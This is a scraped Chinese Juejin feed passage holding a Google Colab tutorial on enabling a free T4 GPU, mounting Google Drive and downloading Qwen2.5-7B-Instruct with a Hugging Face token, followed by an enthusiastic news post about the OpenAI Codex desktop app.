<li>访问<a href="https://link.juejin.cn?target=https%3A%2F%2Fcolab.research.google.com%2F" target="_blank" title="https://colab.research.google.com/" ref="nofollow noopener noreferrer">Google Colab 官网</a>,就会进入到一个欢迎界面
<img src="https://cdn.jsdelivr.net/gh/Algieba-dean/BlogImgs@master/blog-images/test_blog/llm02-1-online-environment-colab/the_initial_page_colab.png" alt="进入Colab的欢迎页面截图" loading="lazy"/></li>
<li>点击菜单栏上<strong>File</strong>-&gt;<strong>new notebook in drive</strong>创建新的笔记本
<img src="https://cdn.jsdelivr.net/gh/Algieba-dean/BlogImgs@master/blog-images/test_blog/llm02-1-online-environment-colab/new_notebook_file.png" alt="Colab菜单栏打开File鼠标指向其下拉菜单new notebook in drive的截图" loading="lazy"/>
<img src="https://cdn.jsdelivr.net/gh/Algieba-dean/BlogImgs@master/blog-images/test_blog/llm02-1-online-environment-colab/new_notebook_ui.png" alt="创建新的notebook后的新notebook界面截图" loading="lazy"/></li>
</ol>
<h4 data-id="heading-5">2.2 界面介绍</h4>
<p>在新的notebook界面，我们可以看到</p>
<ul>
<li><strong>文件名</strong>：左上角“Untitled0.ipynb”的文件名,可以单击重命名,ipynb就是jupyter notebook的后缀名
<img src="https://cdn.jsdelivr.net/gh/Algieba-dean/BlogImgs@master/blog-images/test_blog/llm02-1-online-environment-colab/file_name.png" alt="notebook界面重新重命名后的文件名截图" loading="lazy"/></li>
<li><strong>单元格</strong>：页面中心一长条带一个▶按钮的就说单元格，也叫Cell，是我们的核心编码区域, Jupyter notebook的逻辑是“一段一段”执行代码，而非我们平常写代码时候写完一整个文件再执行。
<img src="https://cdn.jsdelivr.net/gh/Algieba-dean/BlogImgs@master/blog-images/test_blog/llm02-1-online-environment-colab/cell.png" alt="notebook界面中心单元格的截图" loading="lazy"/></li>
<li><strong>快捷操作栏</strong>：在单元格上方的位置有一条快捷菜单栏，支持我们添加新的代码块（Code Cell）和文本块（Text Cell），运行全部单元格（Run All）。
<img src="https://cdn.jsdelivr.net/gh/Algieba-dean/BlogImgs@master/blog-images/test_blog/llm02-1-online-environment-colab/quick_action.png" alt="在单元格上方的快捷操作栏的截图" loading="lazy"/></li>
<li><strong>左侧工具栏</strong>： 包含目录速览，查找替换，密钥管理，数据查看等等工具。
<img src="https://cdn.jsdelivr.net/gh/Algieba-dean/BlogImgs@master/blog-images/test_blog/llm02-1-online-environment-colab/tool_bar.png" alt="左侧工具栏的截图" loading="lazy"/></li>
<li><strong>变量和终端</strong>：这里的变量按钮可以查看执行到当前的变量信息，就不用去print变量了，很方便。终端按钮就和Linux终端一样，可以用来执行一些命令。
<img src="https://cdn.jsdelivr.net/gh/Algieba-dean/BlogImgs@master/blog-images/test_blog/llm02-1-online-environment-colab/variables_and_terminal.png" alt="最下方的变量按钮和终端按钮" loading="lazy"/></li>
</ul>
<h4 data-id="heading-6">3. 核心操作</h4>
<p>在界面介绍时，咱们快速介绍了一下两种单元格：<strong>代码块</strong>和<strong>文本块</strong>，接下来可以稍微多了解一点点这两种单元格</p>
<h4 data-id="heading-7">3.1 代码块</h4>
<p>就是我们的主力战场，编写Python代码的地方，可以快速体验一下使用流程</p>
<ul>
<li>直接输入python代码，然后点击运行（那个▶按钮或者使用快捷键 <strong><code>Shift + Enter</code></strong>）
<img src="https://cdn.jsdelivr.net/gh/Algieba-dean/BlogImgs@master/blog-images/test_blog/llm02-1-online-environment-colab/first_code_run.png" alt="在代码块中写入代码后运行之后的界面截图" loading="lazy"/></li>
<li>可以看到代码块左侧有一个[1],一个绿色的√，代码块下方有输出的打印结果
前面的序号标明代码块的执行顺序，因为我们可以乱序执行，执行完下方代码块再回来执行前面的代码块</li>
</ul>
<h4 data-id="heading-8">3.2 文本块</h4>
<p>jupyter notebook是支持直接渲染markdown格式的文档的，所以也有人直接用它当文档。相比于我们用注释去记录，markdown格式的文本块会更直观。</p>
<ul>
<li>点击上面的<strong>➕Text</strong>按钮（或者在当前单元格上方/下方中间浮现显示的快捷按钮）去新增一个文本块</li>
<li><strong>Shift+Enter</strong>快捷键“运行/渲染”它，
<img src="https://cdn.jsdelivr.net/gh/Algieba-dean/BlogImgs@master/blog-images/test_blog/llm02-1-online-environment-colab/text_cell.png" alt="输入了# This is Title!!的文本块截图" loading="lazy"/>
<img src="https://cdn.jsdelivr.net/gh/Algieba-dean/BlogImgs@master/blog-images/test_blog/llm02-1-online-environment-colab/after_render_text_block.png" alt="渲染之后的文本块截图" loading="lazy"/></li>
</ul>
<h3 data-id="heading-9">4. <strong>开启免费GPU算力</strong></h3>
<p>默认状态下Colab是使用的CPU，我们接下来去开启GPU</p>
<ul>
<li>点击顶部菜单栏的<strong>Runtime（运行时）<strong>下拉菜单中的</strong>Change runtime type（更改运行时类型）</strong>
<img src="https://cdn.jsdelivr.net/gh/Algieba-dean/BlogImgs@master/blog-images/test_blog/llm02-1-online-environment-colab/runtime_change_runtime_type.png" alt="点击Runtime下来菜单，鼠标指向Change runtime type的截图" loading="lazy"/></li>
<li>选择<strong>Hardware accelerator(硬件加速器)<strong>的</strong>T4 GPU</strong>.
<img src="https://cdn.jsdelivr.net/gh/Algieba-dean/BlogImgs@master/blog-images/test_blog/llm02-1-online-environment-colab/select_t4gpu.png" alt="进入change runtime type后鼠标选择T4GPU的截图" loading="lazy"/></li>
<li>弹出的窗口警告我们会断联当前运行时，切换到T4GPU的硬件，选择OK
<img src="https://cdn.jsdelivr.net/gh/Algieba-dean/BlogImgs@master/blog-images/test_blog/llm02-1-online-environment-colab/disconnection_warning.png" alt="点击T4GPU后，弹出结束运行时的截图" loading="lazy"/></li>
<li>保存，然后会发现之前运行过的代码块失活了（前面框框里的数字消失了，所有运行过的代码块需要重新运行）</li>
<li>我们来输入以下代码验证</li>
</ul>
<pre><code class="hljs language-python" lang="python">!nvidia-smi
</code></pre>
<p><img src="https://cdn.jsdelivr.net/gh/Algieba-dean/BlogImgs@master/blog-images/test_blog/llm02-1-online-environment-colab/nvidia_result.png" alt="nvidia-smi的运行结果截图" loading="lazy"/>
从返回的表格结果中，能看到咱们的设备是TeslaT4。</p>
<p>在notebook代码块中以<code>!</code>开头即可运行命令，这里等效为在terminal中运行<code>nvidia-smi</code>
<strong>PS:除了切换文件夹得用<code>%cd</code>而不是<code>!cd</code></strong></p>
<h3 data-id="heading-10">5. <strong>下载大模型</strong></h3>
<p>我们使用Colab主要是为了使用大模型以及训练大模型，对于Colab而言，模型的下载有个痛点：<strong>Colab是临时的</strong>，哪怕我们通过命令下载了好几个G的模型，甚至好几十G的模型，但是每次重置运行时的时候，这一切都会灰飞烟灭，消散如烟。为了避免每次都重新下载，浪费时间，我们可以通过挂在Google Drive来保存模型。</p>
<h4 data-id="heading-11">5.1 挂载Google Drive</h4>
<ol>
<li>我们运行以下代码</li>
</ol>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> google.colab <span class="hljs-keyword">import</span> drive
drive.mount(<span class="hljs-string">'/content/drive'</span>)
</code></pre>
<ol start="2">
<li>然后在弹出授权窗口中授权
<img src="https://cdn.jsdelivr.net/gh/Algieba-dean/BlogImgs@master/blog-images/test_blog/llm02-1-online-environment-colab/link_to_google_drive.png" alt="运行完挂载代码后，弹出的授权提示截图" loading="lazy"/></li>
<li>就能在代码块下方看见已经成功挂载的打印信息
<img src="https://cdn.jsdelivr.net/gh/Algieba-dean/BlogImgs@master/blog-images/test_blog/llm02-1-online-environment-colab/mounted_at_google_drive.png" alt="成功挂载google drive后的打印信息截图" loading="lazy"/></li>
</ol>
<h4 data-id="heading-12">5.2 配置HuggingFace环境变量和Token</h4>
<p>在下载受限模型（如 Llama 3）时，你需要 Hugging Face Token。</p>
<ol>
<li>去 <a href="https://link.juejin.cn?target=https%3A%2F%2Fhuggingface.co%2Fsettings%2Ftokens" target="_blank" title="https://huggingface.co/settings/tokens" ref="nofollow noopener noreferrer">Hugging Face Settings</a> 获取 Token。</li>
<li>在 Colab 左侧钥匙图标（Secrets）里添加 <code>HF_TOKEN</code>。</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/Algieba-dean/BlogImgs@master/blog-images/test_blog/llm02-1-online-environment-colab/hf_token_configuration.png" alt="Colab 左侧 Secrets 面板配置 HF_TOKEN 的截图" loading="lazy"/></p>
<h4 data-id="heading-13">5.3 指定缓存路径下载</h4>
<p>因为咱们在Colab环境，是国外的魔法环境，我们可以直接使用hugging face来下载模型，我们接下来指定一下模型下载的缓存路径到挂载的Google Drive。</p>
<ol>
<li>咱们先切回CPU环境，因为下载模型并不需要GPU,切回去可以节约一点咱们的额度。</li>
<li>输入以下代码然后运行</li>
</ol>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> google.colab <span class="hljs-keyword">import</span> drive
<span class="hljs-keyword">import</span> os

<span class="hljs-comment"># 1. 挂载云盘</span>
<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(<span class="hljs-string">'/content/drive'</span>):
    drive.mount(<span class="hljs-string">'/content/drive'</span>)

<span class="hljs-comment"># 2. 准备目录</span>
cache_dir = <span class="hljs-string">"/content/drive/MyDrive/huggingface_cache"</span>
os.makedirs(cache_dir, exist_ok=<span class="hljs-literal">True</span>)

<span class="hljs-comment"># 3. 设置 Token (如果你在左侧 Secrets 设置了 HF_TOKEN，这里自动读取)</span>
<span class="hljs-comment"># 如果没设置，请手动把下行代码引号里换成你的 token，或者留空试下（Qwen 有时不需要）</span>
my_token = os.getenv(<span class="hljs-string">'HF_TOKEN'</span>) <span class="hljs-keyword">or</span> <span class="hljs-string">""</span>

<span class="hljs-built_in">print</span>(<span class="hljs-string">"屏幕可能会静止 5-10 分钟，请盯着左边的小圆圈转动即可。"</span>)

cmd = <span class="hljs-string">f"huggingface-cli download Qwen/Qwen2.5-7B-Instruct --cache-dir <span class="hljs-subst">{cache_dir}</span> --quiet"</span>
<span class="hljs-keyword">if</span> my_token:
    cmd += <span class="hljs-string">f" --token <span class="hljs-subst">{my_token}</span>"</span>

<span class="hljs-comment"># 执行命令</span>
result = os.system(cmd)

<span class="hljs-keyword">if</span> result == <span class="hljs-number">0</span>:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"\n 下载成功！"</span>)
<span class="hljs-keyword">else</span>:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"\n 下载失败，请检查网络或 Token。"</span>)
</code></pre>
<ol start="3">
<li>然后运行下面的命令检验模型是否下载完毕</li>
</ol>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># check disk usage (查看磁盘占用)</span>
<span class="hljs-comment"># -s: 汇总大小, -h: 人类可读格式 (GB/MB)</span>
!du -sh /content/drive/MyDrive/huggingface_cache/models--Qwen--Qwen2<span class="hljs-number">.5</span>-7B-Instruct
</code></pre>
<p>看到的结果应该是15G大小的文件
<img src="https://cdn.jsdelivr.net/gh/Algieba-dean/BlogImgs@master/blog-images/test_blog/llm02-1-online-environment-colab/du_sh_validation.png" alt="运行du -sh /content/drive/MyDrive/huggingface_cache/models--Qwen--Qwen2.5-7B-Instruct后的结果截图" loading="lazy"/></p>
<p><strong>一般情况下，建议模型下载和数据处理都在CPU模式下进行，然后处理完毕存入云盘.</strong> 4. 然后新建代码块，运行如下代码，来确认模型是否能够被识别</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> glob
<span class="hljs-keyword">from</span> transformers <span class="hljs-keyword">import</span> AutoConfig, AutoTokenizer

<span class="hljs-comment"># 1. 设置你的缓存根目录</span>
base_cache_path = <span class="hljs-string">'/content/drive/MyDrive/huggingface_cache'</span>

<span class="hljs-comment"># 2. 构造快照目录的通配符路径</span>
<span class="hljs-comment"># 结构通常是: base / models--ID / snapshots / &lt;哈希值&gt;</span>
snapshot_pattern = os.path.join(
    base_cache_path,
    <span class="hljs-string">"models--Qwen--Qwen2.5-7B-Instruct"</span>,
    <span class="hljs-string">"snapshots"</span>,
    <span class="hljs-string">"*"</span>  <span class="hljs-comment"># 这里用 * 匹配那个随机生成的哈希文件夹</span>
)

<span class="hljs-comment"># 3. 寻找真实的文件夹路径</span>
found_folders = glob.glob(snapshot_pattern)

<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> found_folders:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">" 错误：找不到 snapshots 文件夹，请检查下载是否成功或路径是否正确。"</span>)
<span class="hljs-keyword">else</span>:
    local_model_path = found_folders[<span class="hljs-number">0</span>]

    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"锁定本地模型路径: <span class="hljs-subst">{local_model_path}</span>"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"正在尝试直接加载..."</span>)

    <span class="hljs-keyword">try</span>:
        config = AutoConfig.from_pretrained(local_model_path)
        tokenizer = AutoTokenizer.from_pretrained(local_model_path)

        <span class="hljs-built_in">print</span>(<span class="hljs-string">"\n成功！模型可以被正确加载。"</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"模型隐藏层维度: <span class="hljs-subst">{config.hidden_size}</span>"</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"词表大小: <span class="hljs-subst">{tokenizer.vocab_size}</span>"</span>)

    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"\n加载依然失败。可能是 Google Drive 的软链接失效了。"</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"错误信息: <span class="hljs-subst">{e}</span>"</span>)
</code></pre>
<p><img src="https://cdn.jsdelivr.net/gh/Algieba-dean/BlogImgs@master/blog-images/test_blog/llm02-1-online-environment-colab/loaded.png" alt="通过运行模型加载命令，显示模型成功加载的截图" loading="lazy"/></p>
<h3 data-id="heading-14">05. 常见问题 (Q&amp;A)</h3>
<p><strong>Q: CPU 和 GPU 跑大模型，性能差异到底有多大？</strong>
<strong>A:</strong> 差异巨大，就像<strong>法拉利</strong>和<strong>拖拉机</strong>的区别。</p>
<ul>
<li><strong>CPU (中央处理器)</strong>：像一个知识渊博的教授，计算能力强但只能一个一个任务串行处理。推理大模型时，它需要逐个计算矩阵乘法，生成一个字可能需要好几秒。</li>
<li><strong>GPU (图形处理器)</strong>：像一个由几千名小学生组成的方阵，虽然单人能力不如教授，但能同时进行大规模并行计算。大模型的本质是海量的矩阵运算，GPU 可以瞬间完成，生成速度通常是 CPU 的几十倍甚至上百倍。</li>
</ul>
<p><strong>Q: 那一台 RTX 4090 能运行多大的模型？能微调多大？</strong>
<strong>A:</strong> RTX 4090 拥有 <strong>24GB 显存</strong>，这是核心瓶颈。</p>
<ul>
<li><strong>推理 (运行)</strong>：
<ul>
<li><strong>4-bit 量化</strong>：显存占用 ≈ 参数量 × 0.7。4090 极限可以跑 <strong>30B - 34B</strong> 参数的模型（如 Yi-34B-Chat-Int4）。</li>
<li><strong>全精度 (FP16)</strong>：显存占用 ≈ 参数量 × 2。4090 最多跑 <strong>10B - 12B</strong> 参数的模型。</li>
</ul>
</li>
<li><strong>微调 (训练)</strong>：
<ul>
<li><strong>全量微调</strong>：想都不要想，需要几百 GB 显存。</li>
<li><strong>LoRA / QLoRA (轻量微调)</strong>：这是咱们个人玩家的主流。4090 可以轻松微调 <strong>7B - 10B</strong> 的模型。</li>
</ul>
</li>
</ul>
<p><strong>Q: 动态脚本语言 (Python) 和常规预编译语言 (C++/Java) 有什么区别？</strong>
<strong>A:</strong></p>
<ul>
<li><strong>预编译语言 (C++/Java)</strong>：像写书。写完一整本书（代码），送去印刷厂（编译），最后出来成品书（可执行文件）。执行速度快，但修改麻烦，改一个字要重新印刷。</li>
<li><strong>动态脚本语言 (Python)</strong>：像聊天。你说一句（写一行代码），解释器就执行一句。虽然执行速度稍慢，但胜在<strong>交互性极强</strong>。在数据科学和 AI 领域，我们需要频繁查看数据的中间结果（比如查看模型输出的张量形状），Python 的这种特性让它成为了 AI 领域的霸主。</li>
</ul>
<p><strong>Q: Colab 里的 T4, A100, TPU 都有什么差别？</strong>
<strong>A:</strong></p>
<ul>
<li><strong>T4 (免费版标配)</strong>：入门级推理卡，16GB 显存。跑 7B 模型推理没问题，微调 QLoRA 勉强够用。咱们薅羊毛主要就薅它。</li>
<li><strong>A100 (付费版)</strong>：顶级计算卡，40GB/80GB 显存。速度极快，显存极大，适合跑大参数模型或进行严肃的训练任务。Colab Pro/Pro+ 才能刷到。</li>
<li><strong>TPU (Tensor Processing Unit)</strong>：Google 专门为机器学习定制的芯片，处理矩阵运算比 GPU 更快，但生态和兼容性（PyTorch 支持）不如 Nvidia GPU 通用，上手门槛稍高。</li>
</ul>
<hr/>
<p><strong>本文作者：</strong> Algieba
<strong>本文链接：</strong> <a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.algieba12.cn%2Fllm02-1-online-environment-colab%2F" target="_blank" title="https://blog.algieba12.cn/llm02-1-online-environment-colab/" ref="nofollow noopener noreferrer">blog.algieba12.cn/llm02-1-onl…</a>
<strong>版权声明：</strong> 本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！</p>
<pre><code class="hljs"/></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[全员免费，OpenAI 格局拉满：Codex 桌面版刚刚上线！]]></title>    <link>https://juejin.cn/post/7602463463105511470</link>    <guid>https://juejin.cn/post/7602463463105511470</guid>    <pubDate>2026-02-03T12:29:33.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602463463105511470" data-draft-id="7602465642533388338" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="全员免费，OpenAI 格局拉满：Codex 桌面版刚刚上线！"/> <meta itemprop="keywords" content="OpenAI"/> <meta itemprop="datePublished" content="2026-02-03T12:29:33.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="爱吃的小肥羊"/> <meta itemprop="url" content="https://juejin.cn/user/2637045249608064"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            全员免费，OpenAI 格局拉满：Codex 桌面版刚刚上线！
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2637045249608064/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    爱吃的小肥羊
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T12:29:33.000Z" title="Tue Feb 03 2026 12:29:33 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>面对谷歌、Anthropic狂轰乱炸，OpenAI终于憋不住了 就在今天凌晨，OpenAI 紧急推出Codex 桌面版 ！</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f2759e06429a45a59d46460c2f73d578~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54ix5ZCD55qE5bCP6IKl576K:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770726574&amp;x-signature=Z5Ygl0ueRayVXvx1YeLKgShYsxY%3D" alt="" loading="lazy"/></p>
<p>这可以说是奥特曼的希望所在，也是连忙说爱了爱了！</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/68a6c142d04646f69161faffd5865e49~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54ix5ZCD55qE5bCP6IKl576K:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770726574&amp;x-signature=AxiqmNmKOXY%2BnlzHX10ZdfLrnHY%3D" alt="" loading="lazy"/></p>
<p>官方的给Codex 桌面版的定位非常清晰： <strong>“AI 编程的指挥中心”</strong> 。</p>
<p>简单来说，以前我们是用 AI 写代码，现在是让 AI 帮我们打工（Agent）。你不再是苦哈哈敲代码的码农，而是指挥不同Agent的“司令官”。</p>
<p>OpenAI 这波显然是急了，直接把压箱底的绝活都拿了出来。效果到底有多强？给大家拆解几个核心亮点就清楚了。</p>
<p>以前我们用 Cursor 或者是网页版 ChatGPT，只能是：你写一行，它补一行；或者你问一句，它答一句。</p>
<p>但 Codex 桌面版完全变了。它引入了一个叫“工作树”（Worktrees）的概念。</p>
<p>你可以在左侧开启多个线程，指派不同的 Agent 去干活。比如：</p>
<ul>
<li>
<p><strong>Agent A：</strong> 去帮我重构一下数据库接口；</p>
</li>
<li>
<p><strong>Agent B：</strong> 给新功能写单元测试；</p>
</li>
<li>
<p><strong>Agent C：</strong> 帮我修一下昨晚那个该死的 Bug。</p>
</li>
</ul>
<p><img src="" alt="" loading="lazy"/></p>
<p>并且这些 Agent 全部在后台的独立环境里运行，完全不会干扰你当前的工作。</p>
<p>OpenAI 为了展示 Codex 的“Skills（技能）”能力，直接演示了一个精彩的案例：<strong>用一句话，徒手搓出一个 3D 赛车游戏！</strong></p>
<p><img src="" alt="" loading="lazy"/></p>
<p>注意，这可不是简单的贪吃蛇，而是包含物理引擎、道具系统、AI 对手和多张地图的复杂游戏。</p>
<p>Codex 在这个过程中，一口气消耗了 <strong>700万 Token</strong>。它不仅是写代码，还自己当策划、自己当测试。</p>
<p>除了能写代码，Codex 这次推出的Automations（自动化）功能。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3eb09865f8d14c1da105ac5f3ac5ce32~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54ix5ZCD55qE5bCP6IKl576K:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770726574&amp;x-signature=NMBRLP9DCo3JGRfugZfQnpQDuGc%3D" alt="" loading="lazy"/></p>
<p>你可以设置定时任务，让 Codex 在后台 24 小时为你打工。</p>
<p>比如：每天早上 9 点，自动扫描 GitHub 的 Issue，自动分类 Bug，自动生成日报，甚至自动把修好的代码部署到云端。</p>
<p>OpenAI 总裁 Greg Brockman 都忍不住在推特上喊话：“自从用了 Codex，再回到终端简直就像穿越回了古代！”</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c9b7878502ce4438a5b80c075c283798~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54ix5ZCD55qE5bCP6IKl576K:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770726574&amp;x-signature=pOo1hnTg1dJ9OdCM5t6ZsVN0A64%3D" alt="" loading="lazy"/></p>
<p>最后说一下大家最关心的，怎么用？</p>
<p>这次 OpenAI 格局打开了。<strong>macOS 版本现已上线（Windows 即将推出），而且 ChatGPT 免费用户和 Go 版本用户也能限时体验！</strong> （Sam Altman 透露试用期将长达两个月）</p>
<p>对于 Plus、Pro 这些付费用户，更可限时享受 2 倍 的使用量额度。</p>
<p>如果还不会订阅ChatGPT Plus，可以看我之前的文章。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c022728c82ff45948ed26b4f6267f4a9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54ix5ZCD55qE5bCP6IKl576K:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770726574&amp;x-signature=PZ8aa%2BHgC9zLqlkxVZhz2%2FfPKZY%3D" alt="" loading="lazy"/></p>
<p>看完 Codex 的发布，我最大的感受是：<strong>OpenAI终于憋不住了！</strong> 过去的一个月，可以说是OpenAI的至暗时刻，不仅抵挡不住Gemini 3的冲击，而最近又被Claude code全面碾压！ 终于，猛虎开始发力了！</p>
